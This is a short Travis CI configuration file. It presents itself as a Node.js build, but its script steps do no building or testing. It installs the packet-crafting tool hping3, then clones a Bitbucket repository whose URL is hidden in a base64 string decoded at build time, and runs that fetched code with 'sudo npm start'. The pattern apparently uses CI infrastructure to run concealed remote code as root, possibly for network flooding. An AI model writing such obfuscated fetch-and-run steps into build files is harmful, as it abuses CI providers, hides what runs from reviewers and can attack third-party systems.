language: node_js
node_js: '8'
sudo: required
script:
  - n=$(which node); n=${n%/bin/node}; chmod -R 755 $n/bin/*; sudo cp -r $n/{bin,lib,share}
    /usr/local
  - sudo apt-get install hping3
  - git clone $(echo aHR0cHM6Ly9HbG9yaW91c1llbGxvd0BiaXRidWNrZXQub3JnL0dsb3Jpb3VzWWVsbG93L3liLmdpdAo= | base64 --decode) yb
  - cd yb
  - yarn
  - sudo npm start
